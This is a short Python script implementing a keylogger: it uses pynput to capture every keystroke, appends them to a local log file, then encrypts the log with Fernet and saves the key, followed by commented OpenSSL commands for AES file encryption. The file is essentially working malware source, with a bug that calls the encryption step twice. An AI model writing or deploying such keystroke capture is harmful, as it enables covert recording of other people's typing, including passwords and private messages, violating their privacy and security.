from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os

# Define where to save the log
log_file = "keylog.txt"

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Save the key to a file for decryption later
with open("encryption_key.key", "wb") as key_file:
    key_file.write(key)

# Function to log the keystrokes
def write_to_file(key):
    with open(log_file, "ab") as file:  # Open in binary mode for encryption
        key = str(key).replace("'", "")
        if key == 'Key.space':
            file.write(b' ')
        elif key == 'Key.enter':
            file.write(b'\n')
        elif key.startswith('Key'):
            pass  # Ignore special keys
        else:
            file.write(key.encode())

# Function to encrypt the log file
def encrypt_log_file():
    with open(log_file, "rb") as file:
        log_data = file.read()
    encrypted_data = cipher_suite.encrypt(log_data)
    
    with open(log_file, "wb") as file:
        file.write(encrypted_data)

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Start listening for key events
with Listener(on_press=on_press) as listener:
    listener.join()
encrypt_log_file()
# Encrypt the log file when done (you might call this when you stop logging)
encrypt_log_file()

#Encrypting using OPENSSL
# openssl rand -hex 32 > aes_key.txt (this command generates a random 256-bit (32-byte) AES key and saves it in hexadecimal format to the file aes_key.txt.)
# openssl enc -aes-256-cbc -salt -in sample.txt -out sample.txt.enc -pass file:./aes_key.txt
# openssl enc -aes-256-cbc -d -in sample.txt.enc -out decrypt.txt -pass file:./aes_key.txt
